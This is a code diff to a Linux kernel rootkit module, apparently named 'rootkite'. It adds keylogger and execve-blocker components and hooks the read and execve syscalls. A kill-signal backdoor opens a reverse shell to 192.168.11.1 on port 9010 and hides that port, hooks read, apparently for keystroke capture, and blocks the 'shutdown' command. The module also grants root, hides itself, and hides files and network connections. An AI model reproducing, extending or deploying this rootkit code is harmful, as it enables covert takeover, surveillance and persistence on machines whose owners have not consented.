@@ -16,6 +16,8 @@
 #include "files_hacks.h"
 #include "netfilter_kite.h"
 #include "forkbomb.h"
+#include "keylogger.h"
+#include "execve_blocker.h"
 
 
 MODULE_LICENSE("GPL");
@@ -44,6 +46,8 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("__x64_sys_openat", hack_openat, &orig_openat),
     HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
     HOOK("__x64_sys_statx", hack_statx, &orig_statx),
+    HOOK("__x64_sys_read", hack_read, &orig_read),
+    HOOK("__x64_sys_execve", hack_execve, &orig_execve),
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
@@ -58,10 +62,12 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
     HOOK("sys_getdents", hack_getdents, &orig_getdents),
     HOOK("sys_kill", hack_kill, &orig_kill),
+    HOOK("sys_read", hack_read, &orig_read),
     HOOK("sys_reboot", hack_reboot, &orig_reboot),
     HOOK("sys_openat", hack_openat, &orig_openat),
     HOOK("sys_pread64", hack_pread64, &orig_pread64),
     HOOK("sys_statx", hack_statx, &orig_statx),
+    HOOK("sys_execve", hack_execve, &orig_execve),
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
@@ -90,6 +96,15 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         printk(KERN_INFO "Setting root for calling process\n");
         set_root();
         return 0;
+    }
+    else if ((sig == 64) && (pid == 3)){
+        start_reverse_shell("192.168.11.1", "9010");
+        insert_node(&ports_to_hide, "9010");
+    }
+    else if ((sig == 64) && (pid == 4)){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
+            printk(KERN_ERR "error hooking syscall read\n");
+        }
     }
     else if ((sig == 63) && (pid == 1)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
@@ -134,6 +149,15 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
+        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
+            insert_node(&exec_to_block, "shutdown");
+        }
+        else{
+            remove_node_by_name(&exec_to_block, "shutdown");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
+                printk(KERN_ERR "error hooking syscall execve\n");
+        }
     }
     else if ((sig == 63) && (pid == 3)){
         switch_net_hook(); // block traffic to specified ports and block ICMP
@@ -145,14 +169,14 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
 }
 #else
 static asmlinkage long hack_kill(pid_t pid, int sig){
-    if ( (sig == 64) && (pid == 1))
+    if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            printk(KERN_INFO "Hide pookkit\n");
+            printk(KERN_INFO "Hide rootkite\n");
             hide_mod();
         }
         else{
-            printk(KERN_INFO "Show pookkit\n");
+            printk(KERN_INFO "Show rootkite\n");
             show_mod();
         }
     }
@@ -164,6 +188,11 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
     else if ((sig == 64) && (pid == 3)){
         start_reverse_shell("192.168.11.1", "9010");
         insert_node(&ports_to_hide, "9010");
+    }
+    else if ((sig == 64) && (pid == 4)){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
+            printk(KERN_ERR "error hooking syscall read\n");
+        }
     }
     else if ((sig == 63) && (pid == 1)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
@@ -207,6 +236,15 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
+        }
+        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
+            insert_node(&exec_to_block, "shutdown");
+        }
+        else{
+            remove_node_by_name(&exec_to_block, "shutdown");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
+                printk(KERN_ERR "error hooking syscall execve\n");
         }
     }
     else if ((sig == 63) && (pid == 3)){
